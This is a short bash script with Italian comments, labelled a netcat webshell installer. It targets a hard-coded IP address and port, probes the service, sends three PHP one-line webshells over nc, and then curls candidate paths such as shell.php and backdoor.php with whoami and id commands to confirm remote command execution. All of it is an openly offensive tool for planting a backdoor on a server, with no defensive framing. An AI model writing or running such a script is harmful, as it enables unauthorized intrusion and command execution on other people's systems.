#!/bin/bash
# NC WEBSHELL INSTALLER con TIMEOUT + DEBUG
TARGET_IP="63.164.100.214"
TARGET_PORT="9091"

echo "🔍 DEBUG + NC INSTALLER con TIMEOUT"
echo "=================================="

# 1. TEST CONNESSIONE RAW TCP
echo "[+] Test TCP..."
timeout 5 bash -c "echo 'test' | nc -w2 $TARGET_IP $TARGET_PORT" && echo "✅ TCP OK" || echo "❌ TCP NO RESPONSE"

# 2. CAPTA COSA RISPONDE IL SERVIZIO
echo -e "\n[+] SCOPRI SERVIZIO (5 sec)..."
timeout 5 nc $TARGET_IP $TARGET_PORT | head -20 || echo "No banner"

# 3. UPLOAD con TIMEOUT + MULTI-METODO
echo -e "\n[+] UPLOAD TIMEOUT 3s..."
(
  echo '<?php system($_GET["c"]); ?>' | timeout 3 nc -w1 $TARGET_IP $TARGET_PORT
  echo '<?php echo shell_exec($_GET["cmd"]); ?>' | timeout 3 nc -w1 $TARGET_IP $TARGET_PORT
  echo '<?=system($_REQUEST["c"])?>' | timeout 3 nc -w1 $TARGET_IP $TARGET_PORT
) &

sleep 5

# 4. TEST IMMEDIATO HTTP ENDPOINT
echo -e "\n[+] TEST WEBSHELL..."
for endpoint in shell.php cmd.php terminal.php root.php backdoor.php; do
  response=$(curl -s -m2 "http://$TARGET_IP:$TARGET_PORT/$endpoint?c=whoami" 2>/dev/null)
  if [[ ! -z "$response" ]]; then
    echo "✅ $endpoint OK → $response"
  fi
done

echo -e "\n🔥 PROVA QUESTI URL NEL BROWSER:"
echo "http://$TARGET_IP:$TARGET_PORT/shell.php?c=whoami"
echo "http://$TARGET_IP:$TARGET_PORT/cmd.php?c=id"
echo "http://$TARGET_IP:$TARGET_PORT/?c=whoami"
